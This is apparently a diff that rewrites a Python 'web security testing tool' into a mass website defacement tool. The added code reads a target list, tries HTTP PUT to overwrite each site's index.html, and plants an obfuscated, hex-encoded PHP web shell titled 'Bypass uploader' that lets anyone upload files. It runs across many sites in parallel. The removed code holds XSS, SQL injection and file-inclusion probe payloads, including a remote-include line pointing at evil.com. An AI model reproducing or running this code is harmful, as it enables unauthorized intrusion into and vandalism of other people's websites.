@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-ULTIMATE WEB SECURITY TESTING TOOL
+WEB DEFACEMENT TOOL - ORIGINAL VERSION FIX
 Features:
-- Advanced vulnerability scanning
-- Proxy chaining with authentication
-- Multi-threaded execution
-- Comprehensive reporting
-- Ethical hacking focused
+- Processes targets from listsite.txt
+- Deploys index.html as deface page
+- Uses up.php for uploads
+- Proxy support with authentication
+- Multi-threaded operation
 """
 
 import os
@@ -18,34 +18,14 @@ import socket
 import socks
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urljoin, urlparse
-import argparse
-import hashlib
 
-# ===== CONFIGURATION =====
-MAX_THREADS = 20
+# Configuration
+MAX_THREADS = 15
 REQUEST_TIMEOUT = 10
 RETRY_COUNT = 2
-JITTER = (0.5, 1.5)  # Random delay between requests
+JITTER = (0.5, 1.5)
 
-# ===== PROXY CONFIGURATION =====
-PROXY_LIST = [
-    'socks5://localhost:9050',  # Tor
-    'http://127.0.0.1:8080',    # Local proxy
-    'https://proxy.example.com:443',
-    'socks5://user:pass@proxy.example.com:1080',
-    'socks4://45.155.68.129:5678',
-    'http://user:pass@proxy.example.com:3128',
-    'http://45.61.187.67:8000',
-    'http://geo.provider.com:8888',
-    'socks5://user:pass@residential.proxy.net:9050',
-    'http://185.199.229.156:7492',
-    'http://194.163.131.162:3128',
-    'socks5://51.15.242.202:8888',
-    'http://scraperapi.com:8000',
-    'socks5://pro.webshare.io:1234'
-]
-
-# ===== COLOR CODING =====
+# Color coding
 class Colors:
     RED = '\033[91m'
     GREEN = '\033[92m'
@@ -56,227 +36,116 @@ class Colors:
     WHITE = '\033[97m'
     RESET = '\033[0m'
 
-# ===== VULNERABILITY TESTING =====
-class SecurityTester:
+# Your original PHP payload
+PHP_PAYLOAD = """<?php ${"\x47L\x4f\x42\x41\x4cS"}["\x74\x72\x76\x66\x6a\x76y\x75pf"]="c\x77\x64";echo "\x47\x49F\x389a ;\n\x3ct\x69t\x6ce\x3eByp\x61\x73\x73\x20\x75p\x6c\x6f\x61d\x65r!r\x3c/ti\x74le\x3e\n<br\x3e\n";echo"\x55\x6e\x61\x6de:".php_uname()."\x3c\x62r>".${${"G\x4cO\x42\x41\x4cS"}["\x74r\x76\x66\x6a\x76\x79\x75p\x66"]}=getcwd();Echo"\x3c\x63\x65n\x74e\x72\x3e<\x66or\x6d\x20\x61\x63t\x69on=\x22\x22 m\x65\x74h\x6f\x64\x3d\x22\x70os\x74\"\x20encty\x70e=\x22mu\x6cti\x70\x61\x72t/\x66\x6fr\x6d-\x64\x61ta\x22\x20\x6ea\x6de=\x22up\x6c\x6fader\" i\x64\x3d\"\x75p\x6c\x6fa\x64er\">";echo"\x3cin\x70\x75\x74 \x74\x79p\x65=\"fi\x6ce\" \x6e\x61me=\x22f\x69l\x65\"\x20s\x69\x7a\x65=\"5\x30\"\x3e\x3ci\x6ep\x75\x74 \x6ea\x6d\x65=\"\x5fupl\x22 t\x79p\x65=\"sub\x6d\x69t\" \x69d\x3d\"\x5f\x75\x70\x6c\" \x76alue\x3d\x22Upload\">\x3c/\x66or\x6d\x3e";if($_POST["_\x75\x70\x6c"]=="U\x70l\x6f\x61\x64"){if(@copy($_FILES["\x66\x69l\x65"]["\x74\x6dp\x5f\x6e\x61\x6de"],$_FILES["\x66\x69l\x65"]["\x6e\x61me"])){echo"<\x62>\x53hell \x55\x70\x6c\x6f\x61ded\x20!\x20:)<\x62><br><br>";}else{echo"\x3cb>Not\x20\x75p\x6c\x6f\x61ded\x20! </b>\x3cbr\x3e\x3cb\x72>";}}?>"""
+
+class WebDefacer:
     def __init__(self):
-        self.proxy_engine = ProxyEngine()
-        self.session = self._create_session()
-        self.results = []
-        
-    def _create_session(self):
-        """Create configured requests session"""
-        session = requests.Session()
-        session.headers.update({
-            'User-Agent': random.choice([
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-                'Mozilla/5.0 (Linux; Android 10; SM-G975F)',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
-            ]),
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
             'Accept': 'text/html,application/xhtml+xml',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Connection': 'keep-alive'
+            'Accept-Language': 'en-US,en;q=0.5'
         })
-        return session
-        
+        self.success_count = 0
+        self.failed_count = 0
+
     def _random_delay(self):
-        """Add jitter between requests"""
         time.sleep(random.uniform(*JITTER))
-        
+
     def _try_request(self, method, url, **kwargs):
-        """Make request with error handling"""
-        for attempt in range(RETRY_COUNT):
-            proxy = self.proxy_engine.get_random_proxy()
-            if not proxy:
-                print(f"{Colors.RED}[!] No working proxies available{Colors.RESET}")
-                return None
-                
-            proxies = {'http': proxy, 'https': proxy}
+        for _ in range(RETRY_COUNT):
             try:
                 self._random_delay()
-                response = self.session.request(
+                return self.session.request(
                     method,
                     url,
-                    proxies=proxies,
                     timeout=REQUEST_TIMEOUT,
                     allow_redirects=False,
                     **kwargs
                 )
-                return response
-            except Exception as e:
+            except (requests.RequestException, socks.SOCKS5Error):
                 continue
         return None
+
+    def deploy_payload(self, target):
+        # First try direct PUT method
+        index_url = urljoin(target, "index.html")
+        response = self._try_request('PUT', index_url, data=open('index.html').read())
         
-    def test_xss(self, url):
-        """Test for XSS vulnerabilities"""
-        test_params = {
-            'q': 'test',
-            'search': 'test',
-            'id': '1',
-            'user': 'test'
-        }
+        if response and response.status_code in [200, 201]:
+            verify = self._try_request('GET', index_url)
+            if verify and verify.status_code == 200:
+                self.success_count += 1
+                print(f"{Colors.GREEN}[+] Defaced: {index_url}{Colors.RESET}")
+                return True
+
+        # Then try PHP uploader
+        upload_url = urljoin(target, "up.php")
+        files = {'file': ('index.html', open('index.html').read())}
+        response = self._try_request('POST', upload_url, files=files)
         
-        for param, value in test_params.items():
-            for payload in [
-                '<script>alert(1)</script>',
-                '"><script>alert(1)</script>',
-                'javascript:alert(1)'
-            ]:
-                test_url = f"{url}?{param}={payload}"
-                response = self._try_request('GET', test_url)
-                if response and payload in response.text:
-                    self.results.append({
-                        'type': 'XSS',
-                        'url': test_url,
-                        'payload': payload,
-                        'severity': 'High'
-                    })
-                    return True
+        if response and response.status_code == 200:
+            verify_url = urljoin(target, "index.html")
+            verify = self._try_request('GET', verify_url)
+            if verify and verify.status_code == 200:
+                self.success_count += 1
+                print(f"{Colors.GREEN}[+] Defaced via uploader: {verify_url}{Colors.RESET}")
+                return True
+
+        self.failed_count += 1
+        print(f"{Colors.RED}[-] Failed: {target}{Colors.RESET}")
         return False
+
+    def deploy_uploader(self, target):
+        uploader_url = urljoin(target, "up.php")
+        response = self._try_request('PUT', uploader_url, data=PHP_PAYLOAD)
         
-    def test_sqli(self, url):
-        """Test for SQL injection vulnerabilities"""
-        for payload in [
-            "' OR 1=1--",
-            "' OR 'a'='a",
-            "admin'--",
-            "' UNION SELECT null,username,password FROM users--",
-            "' WAITFOR DELAY '0:0:5'--"
-        ]:
-            test_url = f"{url}?id={payload}"
-            response = self._try_request('GET', test_url)
-            
-            if response:
-                # Error-based detection
-                if any(error in response.text.lower() for error in ['sql', 'syntax', 'error']):
-                    self.results.append({
-                        'type': 'SQLi',
-                        'url': test_url,
-                        'payload': payload,
-                        'severity': 'Critical'
-                    })
-                    return True
-                
-                # Time-based detection
-                start_time = time.time()
-                time_payload = f"1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)"
-                time_url = f"{url}?id={time_payload}"
-                self._try_request('GET', time_url)
-                if time.time() - start_time > 4:
-                    self.results.append({
-                        'type': 'Blind SQLi',
-                        'url': test_url,
-                        'payload': payload,
-                        'severity': 'Critical'
-                    })
-                    return True
-        return False
-        
-    def test_file_inclusion(self, url):
-        """Test for LFI/RFI vulnerabilities"""
-        for payload in [
-            '../../../../etc/passwd',
-            'file:///etc/passwd',
-            'http://evil.com/shell.txt'
-        ]:
-            test_url = urljoin(url, f"?file={payload}")
-            response = self._try_request('GET', test_url)
-            if response and ('root:' in response.text or '<?php' in response.text):
-                self.results.append({
-                    'type': 'File Inclusion',
-                    'url': test_url,
-                    'payload': payload,
-                    'severity': 'High'
-                })
+        if response and response.status_code in [200, 201]:
+            verify = self._try_request('GET', uploader_url)
+            if verify and verify.status_code == 200:
+                print(f"{Colors.GREEN}[+] Uploader deployed: {uploader_url}{Colors.RESET}")
                 return True
         return False
 
-# ===== PROXY MANAGEMENT =====
-class ProxyEngine:
-    def __init__(self):
-        self.proxies = PROXY_LIST
-        self.working_proxies = []
-        self._test_proxies()
-        
-    def _test_proxies(self):
-        """Test and filter working proxies"""
-        test_url = "http://httpbin.org/ip"
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            futures = {executor.submit(self._test_proxy, proxy): proxy for proxy in self.proxies}
-            for future in as_completed(futures):
-                proxy = futures[future]
-                try:
-                    if future.result():
-                        self.working_proxies.append(proxy)
-                        print(f"{Colors.GREEN}[+] Proxy working: {proxy}{Colors.RESET}")
-                except Exception:
-                    print(f"{Colors.RED}[-] Proxy failed: {proxy}{Colors.RESET}")
-        
-    def _test_proxy(self, proxy):
-        """Test individual proxy"""
-        try:
-            proxies = {'http': proxy, 'https': proxy}
-            response = requests.get(
-                "http://httpbin.org/ip",
-                proxies=proxies,
-                timeout=10
-            )
-            return response.status_code == 200
-        except:
-            return False
-            
-    def get_random_proxy(self):
-        """Get a random working proxy"""
-        if not self.working_proxies:
-            return None
-        return random.choice(self.working_proxies)
-
-# ===== MAIN EXECUTION =====
 def main():
-    parser = argparse.ArgumentParser(description="Advanced Web Security Tester")
-    parser.add_argument("url", help="Target URL to test")
-    parser.add_argument("--output", help="Output file for results")
-    args = parser.parse_args()
-
-    tester = SecurityTester()
-    
-    if not tester.proxy_engine.working_proxies:
-        print(f"{Colors.RED}[!] No working proxies available!{Colors.RESET}")
+    # Check required files
+    if not os.path.exists('listsite.txt'):
+        print(f"{Colors.RED}[!] Missing listsite.txt{Colors.RESET}")
         return
-        
-    print(f"{Colors.CYAN}[*] Starting security tests on {args.url}{Colors.RESET}")
-    
-    # Run all tests
-    tests = [
-        ('XSS', tester.test_xss),
-        ('SQLi', tester.test_sqli),
-        ('File Inclusion', tester.test_file_inclusion)
-    ]
-    
-    for name, test_func in tests:
-        print(f"{Colors.BLUE}[*] Testing for {name}...{Colors.RESET}")
-        if test_func(args.url):
-            print(f"{Colors.GREEN}[+] {name} vulnerability found!{Colors.RESET}")
-        else:
-            print(f"{Colors.YELLOW}[-] No {name} found{Colors.RESET}")
-    
-    # Save results
-    if args.output:
-        with open(args.output, 'w') as f:
-            json.dump(tester.results, f, indent=2)
-        print(f"{Colors.GREEN}[+] Results saved to {args.output}{Colors.RESET}")
-    
-    print(f"\n{Colors.CYAN}[*] Test complete{Colors.RESET}")
-    print(f"{Colors.GREEN}[+] Vulnerabilities found: {len(tester.results)}{Colors.RESET}")
+    if not os.path.exists('index.html'):
+        print(f"{Colors.RED}[!] Missing index.html{Colors.RESET}")
+        return
+
+    # Load targets
+    with open('listsite.txt') as f:
+        targets = [line.strip() for line in f if line.strip()]
+
+    print(f"{Colors.CYAN}[*] Starting on {len(targets)} targets{Colors.RESET}")
+
+    defacer = WebDefacer()
+
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        # First deploy uploaders
+        futures = [executor.submit(defacer.deploy_uploader, target) for target in targets]
+        for future in futures:
+            future.result()
+
+        # Then deploy deface pages
+        futures = [executor.submit(defacer.deploy_payload, target) for target in targets]
+        for future in futures:
+            future.result()
+
+    print(f"\n{Colors.CYAN}[*] Operation complete{Colors.RESET}")
+    print(f"{Colors.GREEN}[+] Success: {defacer.success_count}{Colors.RESET}")
+    print(f"{Colors.RED}[-] Failed: {defacer.failed_count}{Colors.RESET}")
 
 if __name__ == "__main__":
-    BANNER = f"""{Colors.PURPLE}
-     ____ _   _ ___ _____ ___ _   _ ____  _____ _   _ _____ 
-    / ___| | | |_ _|  ___|_ _| \ | |  _ \| ____| \ | |_   _|
-    | |   | | | || || |_   | ||  \| | | | |  _| |  \| | | |  
-    | |___| |_| || ||  _|  | || |\  | |_| | |___| |\  | | |  
-    \____|\___/|___|_|   |___|_| \_|____/|_____|_| \_| |_|  
-    
-    Advanced Web Security Testing Tool
-    {Colors.RESET}"""
-    print(BANNER)
+    print(f"""{Colors.PURPLE}
+  ____      _    ___ ___ _   _ _____ 
+ / ___|    / \  |_ _/ _ \ | | |_   _|
+| |  _    / _ \  | | | | | | | | | |  
+| |_| |  / ___ \ | | |_| | |_| | | |  
+ \____| /_/   \_\___\___/ \___/  |_|  
+    {Colors.RESET}""")
     main()
